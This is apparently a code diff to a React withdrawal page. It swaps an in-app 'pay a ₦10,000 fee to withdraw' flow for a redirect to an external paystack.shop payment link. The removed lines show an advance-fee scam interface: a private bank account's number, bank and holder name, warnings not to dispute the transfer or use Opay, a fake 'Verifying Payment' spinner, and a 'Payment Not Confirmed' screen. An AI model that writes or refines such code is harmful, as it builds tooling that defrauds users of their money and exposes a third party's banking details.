@@ -46,16 +46,16 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
 
   const handleWithdrawalNoticeConfirm = () => {
     setShowWithdrawalNotice(false);
-    setIsLoading(true);
+    toast({
+      title: "Redirecting to Paystack",
+      description: "You'll be redirected to complete the withdrawal validation...",
+      duration: 2000,
+    });
     
     setTimeout(() => {
-      setIsLoading(false);
-      setShowPaymentDetails(true);
-      // Auto show transfer notice after showing payment details
-      setTimeout(() => {
-        setShowTransferNotice(true);
-      }, 500);
-    }, 5000);
+      window.open('https://paystack.shop/pay/i0nj8tjxcp', '_blank');
+      onBack();
+    }, 1500);
   };
 
   const handleContinuePayment = () => {
@@ -205,174 +205,7 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
         </DialogContent>
       </Dialog>
 
-      {/* Payment Details Dialog - Full Screen */}
-      <Dialog open={showPaymentDetails} onOpenChange={() => {}}>
-        <DialogContent className="max-w-full w-full h-full border-0 bg-white p-0 m-0 rounded-none">
-          <div className="flex items-center justify-center h-full p-4">
-            <div className="max-w-sm w-full space-y-6">
-              <div className="text-center space-y-4">
-                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
-                  <div className="w-8 h-8 bg-green-600 rounded flex items-center justify-center">
-                    <div className="w-4 h-2 bg-white rounded"></div>
-                  </div>
-                </div>
-                
-                <h2 className="text-2xl font-semibold">Make Payment</h2>
-                <p className="text-gray-600">Transfer to the account below</p>
-
-                <div className="space-y-3">
-                  <div className="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
-                    <div>
-                      <p className="text-sm text-gray-600">Account Number</p>
-                      <p className="font-semibold">6957666738</p>
-                    </div>
-                    <button 
-                      onClick={() => copyToClipboard('6957666738', 'Account number')}
-                      className="p-2 hover:bg-gray-200 rounded-full"
-                    >
-                      <Copy className="w-4 h-4" />
-                    </button>
-                  </div>
-
-                  <div className="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
-                    <div>
-                      <p className="text-sm text-gray-600">Bank Name</p>
-                      <p className="font-semibold">MONIEPOINT MFB</p>
-                    </div>
-                    <button 
-                      onClick={() => copyToClipboard('MONIEPIONT MFB', 'Bank name')}
-                      className="p-2 hover:bg-gray-200 rounded-full"
-                    >
-                      <Copy className="w-4 h-4" />
-                    </button>
-                  </div>
-
-                  <div className="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
-                    <div>
-                      <p className="text-sm text-gray-600">Account Name</p>
-                      <p className="font-semibold">Chinemerem Liberty sunday</p>
-                    </div>
-                    <button 
-                      onClick={() => copyToClipboard('Chinemerem Liberty sunday', 'Account name')}
-                      className="p-2 hover:bg-gray-200 rounded-full"
-                    >
-                      <Copy className="w-4 h-4" />
-                    </button>
-                  </div>
-                </div>
-
-                <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
-                  <p className="text-sm text-gray-600">Fee</p>
-                  <p className="text-2xl font-bold text-green-600">₦10,000</p>
-                  
-                  <Button 
-                    onClick={handlePaymentConfirm}
-                    className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full mt-4"
-                  >
-                    I have paid
-                  </Button>
-                </div>
-              </div>
-            </div>
-          </div>
-        </DialogContent>
-      </Dialog>
-
-      {/* Transfer Notice Dialog */}
-      <Dialog open={showTransferNotice} onOpenChange={() => {}}>
-        <DialogContent className="max-w-sm mx-auto">
-          <div className="text-center py-4 space-y-4">
-            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
-              <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center">
-                <div className="w-4 h-4 bg-white rounded-full"></div>
-              </div>
-            </div>
-            
-            <h2 className="text-xl font-semibold">Pay NGN ₦10,000.00</h2>
-            <p className="text-gray-600">Before you make this transfer</p>
-
-            <div className="space-y-3 text-left">
-              <div className="flex items-start space-x-3">
-                <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
-                <div>
-                  <p className="font-semibold text-orange-600">Transfer only the exact amount</p>
-                  <p className="text-sm text-gray-600">Do not transfer an incorrect amount.</p>
-                </div>
-              </div>
-
-              <div className="flex items-start space-x-3">
-                <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
-                <div>
-                  <p className="font-semibold text-orange-600">Do not dispute any transactions made  to our account</p>
-                  <p className="text-sm text-gray-600">It can cause restrictions and other impacts.</p>
-                </div>
-              </div>
-
-              <div className="flex items-start space-x-3">
-                <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
-                <div>
-                  <p className="font-semibold text-orange-600">Avoid using Opay bank for your payment</p>
-                  <p className="text-sm text-gray-600">This can lead to delays is verifying your payment.</p>
-                </div>
-              </div>
-
-              <div className="flex items-start space-x-3 p-3 bg-blue-50 rounded">
-                <input type="checkbox" className="mt-1" defaultChecked />
-                <p className="text-sm">I understand these instructions.</p>
-              </div>
-            </div>
-
-            <Button 
-              onClick={handleContinuePayment}
-              className="w-full bg-green-600 hover:bg-green-700 text-white"
-            >
-              Continue Payment
-            </Button>
-          </div>
-        </DialogContent>
-      </Dialog>
-
-      {/* Processing Payment Dialog - Full Screen */}
-      <Dialog open={showProcessingPayment} onOpenChange={() => {}}>
-        <DialogContent className="max-w-full w-full h-full border-0 bg-green-600 text-white p-0 m-0 rounded-none">
-          <div className="flex items-center justify-center h-full">
-            <div className="text-center space-y-6">
-              <h2 className="text-3xl font-bold">Verifying Payment</h2>
-              <div className="flex justify-center">
-                <div className="w-20 h-20 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
-              </div>
-              <p className="text-green-100 text-lg">Please wait while we verify your payment...</p>
-            </div>
-          </div>
-        </DialogContent>
-      </Dialog>
-   
-      {/* Payment Declined Dialog - Full Screen */}
-      <Dialog open={showDeclined} onOpenChange={() => {}}>
-        <DialogContent className="max-w-full w-full h-full border-0 bg-gray-100 p-0 m-0 rounded-none">
-          <div className="flex items-center justify-center h-full p-4">
-            <div className="bg-white rounded-lg p-8 max-w-sm w-full text-center space-y-6">
-              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
-                <AlertCircle className="w-8 h-8 text-red-600" />
-              </div>
-              
-              <div>
-                <h2 className="text-2xl font-bold text-red-600 mb-2">Payment Not Confirmed</h2>
-                <p className="text-gray-600">
-                  Payment not confirmed. Please don't dispute any transfer to us. Contact support instead.
-                </p>
-              </div>
-
-              <Button 
-                onClick={handleDeclinedRetry}
-                className="w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-full"
-              >
-                Go Back
-              </Button>
-            </div>
-          </div>
-        </DialogContent>
-      </Dialog>
+      
     </>
   );
 };
